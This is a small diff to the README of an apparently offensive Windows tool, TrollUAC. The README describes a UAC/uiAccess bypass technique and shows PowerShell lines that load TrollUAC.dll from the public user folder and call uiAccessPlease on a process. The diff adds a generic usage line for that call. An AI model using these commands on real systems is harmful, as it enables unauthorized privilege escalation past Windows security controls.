@@ -25,6 +25,7 @@ Refer to article for full explanation, technique is 5 years old but still works 
 ```
 > Start with Medium Integrity
 > [System.Reflection.Assembly]::LoadFrom("C:\users\public\TrollUAC.dll")   //can Load() as well 
+> [TrollUAC]::uiAccessPlease(<Process>)  //for non sys32 binaries, set full path
 > [TrollUAC]::uiAccessPlease("notepad")
 ```
 
